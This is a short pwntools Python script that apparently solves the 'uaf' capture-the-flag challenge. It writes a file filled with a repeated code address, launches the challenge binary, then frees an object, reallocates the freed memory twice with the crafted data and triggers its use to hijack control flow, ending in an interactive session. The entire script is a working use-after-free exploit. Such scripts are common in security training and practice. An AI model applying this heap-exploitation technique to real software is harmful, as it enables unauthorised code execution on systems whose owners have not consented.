from pwn import *

''' Create file '''
size = 0x18
path = "/tmp/uaf_file"
data = p64(0x401588) * 3
with open(path, 'wb') as f:
    f.write(data)

''' Spawn process '''
p = process(["/home/ubuntu/ctf/pwnable/uaf", str(size), path])
gdb.attach(p)

''' Inputs '''
def use():
    p.sendline("1")

def after():
    p.sendline("2")

def free():
    p.sendline("3")

''' Exploit '''
if __name__ == '__main__':
    free()
    after()
    after()
    use()
    p.interactive()
